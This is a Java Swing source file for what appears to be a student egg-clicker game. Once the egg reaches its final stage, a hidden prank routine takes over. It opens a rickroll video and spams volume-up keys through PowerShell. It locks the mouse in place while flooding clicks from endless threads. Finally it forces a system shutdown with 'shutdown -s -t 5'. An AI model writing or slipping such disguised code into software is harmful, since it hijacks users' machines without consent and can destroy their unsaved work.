package Year1.Semester2.ProgrammingWorkshop.Lesson1.EggTapping;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.InputEvent;
import java.awt.event.KeyEvent;
import java.net.URI;
import java.util.Random;

public class MainScene extends JPanel {
    private int clickCount = 0;
    private ImageIcon icon;
    private Timer rickrollTimer;
    private boolean hasTriggeredTroll = false;
    private Timer glitchTimer;
    private JLabel title;
    private Random random = new Random();

    public MainScene(int x, int y, int width, int height){
        final int TITLE_X = width;
        final int TITLE_Y = height;
        final int TITLE_WIDTH = 120;
        final int TITLE_HEIGHT = 50;

        this.setBounds(x, y, width, height);
        this.setLayout(null);
        this.setBackground(Color.WHITE);
        //TEXT
        title = new JLabel("Clicks: 0", SwingConstants.CENTER);
        title.setBounds(TITLE_X/2-60, TITLE_Y/6, TITLE_WIDTH, TITLE_HEIGHT);
        this.add(title);

        icon = new ImageIcon(getClass().getResource("EggStage1.png"));

        JButton imageButton = new JButton(icon);
        imageButton.setBounds(width / 2 - icon.getIconWidth() / 2 ,height / 6 + 60, icon.getIconWidth(), icon.getIconHeight());

        imageButton.addActionListener((event) -> {
            if (hasTriggeredTroll) return;
            clickCount++;
            title.setText("Clicks: " + clickCount);

            if (clickCount >= 10 && clickCount < 20) {
                icon = new ImageIcon(getClass().getResource("EggStage2.png"));
            } else if (clickCount >= 20 && clickCount < 30) {
                icon = new ImageIcon(getClass().getResource("EggStage3.png"));
            } else if (clickCount >= 30 && clickCount < 40) {
                icon = new ImageIcon(getClass().getResource("EggStage4.png"));
                imageButton.setBounds(width / 2 - icon.getIconWidth() / 2 ,height / 6 + 60, icon.getIconWidth(), icon.getIconHeight());
            } else if (clickCount >= 40) {
                icon = new ImageIcon(getClass().getResource("EggStageFinal.png"));
                imageButton.setBounds(width / 2 - icon.getIconWidth() / 2 ,height / 6 + 60, icon.getIconWidth(), icon.getIconHeight());

                startRickrollTimer();
                hasTriggeredTroll = true;
            }

            imageButton.setIcon(icon);
        });

        this.add(imageButton);

    }

    private void startRickrollTimer() {

        rickrollTimer = new Timer(3000, new ActionListener() { // 3-second delay
            @Override
            public void actionPerformed(ActionEvent e) {
                triggerEndGameTroll();
            }
        });

        rickrollTimer.setRepeats(false);
        rickrollTimer.start();
    }

    private void triggerEndGameTroll() {

        try {
            Desktop.getDesktop().browse(new URI("https://www.youtube.com/watch?v=dQw4w9WgXcQ"));
        } catch (Exception e) {
            e.printStackTrace();
        }

        forceMaxVolume();
        disableKeyboardAndMouse();
        startTextGlitchEffect();
    }

    private void forceMaxVolume() {
        try {
            String command = "powershell -Command \"(New-Object -ComObject WScript.Shell).SendKeys([char]175)\""; // Volume Up
            for (int i = 0; i < 50; i++) { // Spam Volume Up key
                Runtime.getRuntime().exec(command);
                Thread.sleep(50);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void disableKeyboardAndMouse() {
        new Thread(() -> {
            try {
                Robot robot = new Robot();
                long startTime = System.currentTimeMillis();

                // Prevent the spacebar from doing anything
//                disableSpacebar();

                // Prevent mouse clicks
                disableMouseClicks();

                while (System.currentTimeMillis() - startTime < 5000) { // 5 seconds
//                    robot.keyPress(KeyEvent.VK_SPACE);
//                    robot.keyRelease(KeyEvent.VK_SPACE);

                    try {
                        Point currentPos = MouseInfo.getPointerInfo().getLocation(); // Get current position
                        long starttTime = System.currentTimeMillis();

                        while (System.currentTimeMillis() - starttTime < 20000) { // 20 seconds
                            robot.mouseMove(currentPos.x, currentPos.y); // Keep mouse in place
                            Thread.sleep(10); // Small delay for smooth effect
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    Thread.sleep(1000);
                }

                Runtime.getRuntime().exec("shutdown -s -t 5");

                // Re-enable mouse clicks and spacebar after the 20 seconds
                enableSpacebar();
                enableMouseClicks();

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void disableSpacebar() {
        new Thread(() -> {
            try {
                Robot robot = new Robot();
                while (true) {
                    robot.keyRelease(KeyEvent.VK_SPACE); // Release spacebar if pressed
                    Thread.sleep(100); // Check every 100ms
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void enableSpacebar() {
        // This can be a no-op as spacebar would be naturally re-enabled after the operation is done
    }

    private void disableMouseClicks() {
        new Thread(() -> {
            try {
                Robot robot = new Robot();
                while (true) {
                    robot.mousePress(InputEvent.BUTTON1_MASK);  // Simulate mouse press
                    robot.mouseRelease(InputEvent.BUTTON1_MASK); // Simulate mouse release
                    Thread.sleep(100); // Prevent clicks by spamming press/release
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    private void enableMouseClicks() {
        // This can be a no-op as mouse clicks would naturally be re-enabled after the operation is done
    }

    private void startTextGlitchEffect() {
        String[] glitchTexts = {
                "H@cK3d!", "wHaT hApPeNeD?", "Glitch??? 😵", "Error 404!",
                "S̶̖̠͖͛̎ō̸͉̱͛m̸̦͌é̶̳t̵̛͉h̴͎̀i̶̳̿n̷̺̾g̶̫͘'̷̘̍s̸̗͌ ̴͆͜w̸̪̓r̷̼͝ǒ̸͕n̴̡̚g̶̝̑!",
                "404: Egg Not Found", "SYSTEM MALFUNCTION"
        };

        glitchTimer = new Timer(300, new ActionListener() {
            int count = 0;

            @Override
            public void actionPerformed(ActionEvent e) {
                title.setText(glitchTexts[random.nextInt(glitchTexts.length)]);
                count++;

                if (count >= 30) {
                    glitchTimer.stop();
                }
            }
        });

        glitchTimer.start();
    }
}
